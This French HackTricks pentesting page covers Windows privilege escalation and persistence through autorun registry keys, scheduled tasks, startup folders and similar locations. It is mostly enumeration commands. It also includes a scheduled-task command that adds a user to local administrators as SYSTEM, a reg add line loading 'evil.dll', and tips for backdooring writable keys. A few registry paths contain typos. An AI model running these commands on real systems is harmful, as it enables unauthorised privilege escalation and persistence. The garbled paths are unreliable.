# Élévation de privilèges avec Autoruns

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** peut être utilisé pour exécuter des programmes au **démarrage**. Pour voir quels binaires sont programmés pour s'exécuter au démarrage :
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tâches planifiées

Les **tâches** peuvent être planifiées pour s'exécuter avec **une certaine fréquence**. Vérifiez quels binaires sont programmés pour s'exécuter avec:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Dossiers

Tous les binaires situés dans les **dossiers de démarrage seront exécutés au démarrage**. Les dossiers de démarrage courants sont ceux énumérés ci-dessous, mais le dossier de démarrage est indiqué dans le registre. [Lisez ceci pour savoir où.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registre

{% hint style="info" %}
Remarque: L'entrée de registre **Wow6432Node** indique que vous exécutez une version Windows 64 bits. Le système d'exploitation utilise cette clé pour afficher une vue distincte de HKEY\_LOCAL\_MACHINE\SOFTWARE pour les applications 32 bits qui s'exécutent sur des versions Windows 64 bits.
{% endhint %}

### Exécutions

Registre AutoRun couramment connu:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Les clés de registre Run et RunOnce font en sorte que les programmes s'exécutent chaque fois qu'un utilisateur se connecte. La valeur de données pour une clé est une ligne de commande ne dépassant pas 260 caractères.

**Exécutions de services** (peut contrôler le démarrage automatique des services lors du démarrage):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Il n'est pas créé par défaut sur Windows Vista et versions ultérieures. Les entrées de clé de registre Run peuvent faire référence directement à des programmes ou les répertorier comme une dépendance. Par exemple, il est possible de charger une DLL à la connexion en utilisant une clé "Depend" avec RunOnceEx: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

{% hint style="info" %}
**Exploit 1**: Si vous pouvez écrire dans l'un des registres mentionnés à l'intérieur de **HKLM**, vous pouvez escalader les privilèges lorsqu'un utilisateur différent se connecte.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Si vous pouvez écraser l'un des binaires indiqués sur l'un des registres à l'intérieur de **HKLM**, vous pouvez modifier ce binaire avec une porte dérobée lorsqu'un utilisateur différent se connecte et escalader les privilèges.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Chemin de démarrage

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Tout raccourci créé vers l'emplacement pointé par la sous-clé Startup lancera le service lors de la connexion/redémarrage. L'emplacement de démarrage est spécifié à la fois pour la machine locale et l'utilisateur actuel.

{% hint style="info" %}
Si vous pouvez écraser n'importe quel dossier \[User] Shell sous **HKLM**, vous pourrez le pointer vers un dossier contrôlé par vous et placer une porte dérobée qui sera exécutée chaque fois qu'un utilisateur se connecte au système, en escaladant les privilèges.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Clés Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Généralement, la clé **Userinit** pointe vers userinit.exe, mais si cette clé peut être modifiée, alors cet exe sera également lancé par Winlogon.\
La clé **Shell** doit pointer vers explorer.exe.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Si vous pouvez écraser la valeur du registre ou le binaire, vous pourrez élever les privilèges.
{% endhint %}

### Paramètres de stratégie

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Vérifiez la clé **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

Chemin: **`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`**

Sous la clé de registre `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot`, la valeur **AlternateShell** est définie par défaut sur `cmd.exe` (l'invite de commande). Lorsque vous appuyez sur F8 pendant le démarrage et sélectionnez "Mode sans échec avec invite de commandes", le système utilise cette shell alternative.\
Cependant, vous pouvez créer une option de démarrage pour ne pas avoir à appuyer sur F8, puis sélectionner "Mode sans échec avec invite de commandes".

1. Modifiez les attributs du fichier boot.ini (c:\boot.ini) pour le rendre non lisible, non système et non caché (attrib c:\boot.ini -r -s -h).
2. Ouvrez boot.ini.
3. Ajoutez une ligne similaire à celle-ci : `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Enregistrez le fichier.
5. Réappliquez les autorisations correctes (attrib c:\boot.ini +r +s +h).

Info provenant [ici](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell).

{% hint style="info" %}
**Exploit 1:** Si vous pouvez modifier cette clé de registre, vous pouvez pointer votre porte dérobée.
{% endhint %}

{% hint style="info" %}
**Exploit 2 (permissions d'écriture sur le PATH)** : Si vous avez la permission d'écriture sur n'importe quel dossier du système **PATH** avant _C:\Windows\system32_ (ou si vous pouvez le modifier), vous pouvez créer un fichier cmd.exe et si quelqu'un initie la machine en mode sans échec, votre porte dérobée sera exécutée.
{% endhint %}

{% hint style="info" %}
**Exploit 3 (permissions d'écriture sur le PATH et sur boot.ini)** : Si vous pouvez écrire sur boot.ini, vous pouvez automatiser le démarrage en mode sans échec pour le prochain redémarrage.
{% endhint %}
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Composant installé

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Active Setup s'exécute avant l'apparition du bureau. Les commandes lancées par Active Setup s'exécutent de manière synchrone, bloquant la connexion pendant leur exécution. Active Setup est exécuté avant que les entrées de registre Run ou RunOnce ne soient évaluées.

À l'intérieur de ces clés, vous trouverez d'autres clés et chacune d'entre elles contiendra des clés-valeurs intéressantes. Les plus intéressantes sont :

* **IsInstalled :**
  * 0 : La commande du composant ne s'exécutera pas.
  * 1 : La commande du composant sera exécutée une fois par utilisateur. C'est la valeur par défaut (si la valeur IsInstalled n'existe pas).
* **StubPath**
  * Format : N'importe quelle ligne de commande valide, par exemple "notepad"
  * C'est la commande qui est exécutée si Active Setup détermine que ce composant doit s'exécuter lors de la connexion.

{% hint style="info" %}
Si vous pouviez écrire/écraser n'importe quelle clé avec _**IsInstalled == "1"**_ la clé **StubPath**, vous pourriez la pointer vers une porte dérobée et escalader les privilèges. De plus, si vous pouviez écraser n'importe quel **binaire** pointé par n'importe quelle clé **StubPath**, vous pourriez être en mesure d'escalader les privilèges.
{% endhint %}
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Objets d'aide de navigateur

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Un **objet d'aide de navigateur** (**BHO**) est un module DLL conçu comme un plugin pour le navigateur web Internet Explorer de Microsoft pour fournir une fonctionnalité supplémentaire. Ces modules sont exécutés pour chaque nouvelle instance d'Internet Explorer et pour chaque nouvelle instance de l'Explorateur Windows. Cependant, un BHO peut être empêché d'être exécuté par chaque instance d'Explorer en définissant la clé **NoExplorer** à 1.

Les BHO sont toujours pris en charge à partir de Windows 10, via Internet Explorer 11, tandis que les BHO ne sont pas pris en charge dans le navigateur web par défaut Microsoft Edge.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
Notez que le registre contiendra 1 nouveau registre par dll et sera représenté par le **CLSID**. Vous pouvez trouver les informations CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Extensions Internet Explorer

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Notez que le registre contiendra 1 nouveau registre par dll et sera représenté par le **CLSID**. Vous pouvez trouver les informations CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Pilotes de police de caractères

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Commande d'ouverture

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Options d'exécution de fichiers image

Les Options d'exécution de fichiers image sont une fonctionnalité de Windows qui permet de spécifier un programme à exécuter chaque fois qu'un programme spécifique est lancé. Cette fonctionnalité peut être utilisée pour lancer un programme malveillant à la place d'un programme légitime, ce qui peut entraîner une élévation de privilèges locale. Les Options d'exécution de fichiers image sont stockées dans la clé de registre `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. Les sous-clés de cette clé contiennent le nom des programmes et les valeurs contiennent le chemin du programme à exécuter. Pour exploiter cette vulnérabilité, un attaquant doit avoir un accès en écriture à la clé de registre mentionnée ci-dessus.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Notez que tous les sites où vous pouvez trouver des autoruns sont **déjà recherchés par** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Cependant, pour une liste **plus complète des fichiers auto-exécutés**, vous pouvez utiliser [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) de SysInternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Plus

Trouvez plus d'Autoruns comme les registres dans [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Références

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière de hacking** et que vous voulez hacker l'impénétrable - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
